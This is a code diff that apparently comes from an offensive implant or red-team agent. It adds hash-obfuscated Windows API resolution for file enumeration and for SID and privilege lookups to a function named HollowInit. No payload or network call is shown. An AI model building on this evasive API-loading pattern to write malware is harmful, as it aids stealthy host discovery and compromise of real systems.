@@ -43,8 +43,14 @@ BOOL HollowInit() {
 		hollow->Win32.GetLastError = (decltype(hollow->Win32.GetLastError))api::GetProcAddress(k32, api::hashs::win32::GetLastError);
 		hollow->Win32.CreateFileA = (decltype(hollow->Win32.CreateFileA))api::GetProcAddress(k32, api::hashs::win32::CreateFileA);
 		hollow->Win32.ReadFile = (decltype(hollow->Win32.ReadFile))api::GetProcAddress(k32, api::hashs::win32::ReadFile);
+		hollow->Win32.GetFullPathNameA = (decltype(hollow->Win32.GetFullPathNameA))api::GetProcAddress(k32, api::hashs::win32::GetFullPathNameA);
+		hollow->Win32.GetFileAttributesA = (decltype(hollow->Win32.GetFileAttributesA))api::GetProcAddress(k32, api::hashs::win32::GetFileAttributesA);
+		hollow->Win32.FindNextFileA = (decltype(hollow->Win32.FindNextFileA))api::GetProcAddress(k32, api::hashs::win32::FindNextFileA);
+		hollow->Win32.FindFirstFileA = (decltype(hollow->Win32.FindFirstFileA))api::GetProcAddress(k32, api::hashs::win32::FindFirstFileA);
 		hollow->Win32.SetCurrentDirectoryA = (decltype(hollow->Win32.SetCurrentDirectoryA))api::GetProcAddress(k32, api::hashs::win32::SetCurrentDirectoryA);
 		hollow->Win32.GetCurrentDirectoryA = (decltype(hollow->Win32.GetCurrentDirectoryA))api::GetProcAddress(k32, api::hashs::win32::GetCurrentDirectoryA);
+		
+		
 		DEBUG_LOGA("[*] Loaded kernel32 apis");
 
 
@@ -57,6 +63,7 @@ BOOL HollowInit() {
 		hollow->ntapi.NtOpenProcessToken = (decltype(hollow->ntapi.NtOpenProcessToken))api::GetProcAddress(ntdll, api::hashs::ntdll::NtOpenProcessToken);
 		hollow->ntapi.RtlRandomEx = (decltype(hollow->ntapi.RtlRandomEx))api::GetProcAddress(ntdll, api::hashs::ntdll::RtlRandomEx);
 		hollow->ntapi.RtlGetNtVersionNumbers = (decltype(hollow->ntapi.RtlGetNtVersionNumbers))api::GetProcAddress(ntdll, api::hashs::ntdll::RtlGetNtVersionNumbers);
+		hollow->ntapi.RtlNtStatusToDosError = (decltype(hollow->ntapi.RtlNtStatusToDosError))api::GetProcAddress(ntdll, api::hashs::ntdll::RtlNtStatusToDosError);
 		DEBUG_LOGA("[*] Loaded ntdll apis");
 
 	}
@@ -80,6 +87,11 @@ BOOL HollowInit() {
 
 	if (hollow->Modules.advapi) {
 		hollow->Win32.GetUserNameA = (decltype(hollow->Win32.GetUserNameA))api::GetProcAddress(hollow->Modules.advapi, api::hashs::win32::GetUserNameA);
+		hollow->Win32.LookupAccountSidA = (decltype(hollow->Win32.LookupAccountSidA))api::GetProcAddress(hollow->Modules.advapi, api::hashs::win32::LookupAccountSidA);
+		hollow->Win32.LookupPrivilegeNameA = (decltype(hollow->Win32.LookupPrivilegeNameA))api::GetProcAddress(hollow->Modules.advapi, api::hashs::win32::LookupPrivilegeNameA);
+		hollow->Win32.ConvertSidToStringSidA = (decltype(hollow->Win32.ConvertSidToStringSidA))api::GetProcAddress(hollow->Modules.advapi, api::hashs::win32::ConvertSidToStringSidA);
+		
+		
 		DEBUG_LOGA("[*] Loaded advapi32 apis");
 
 	}
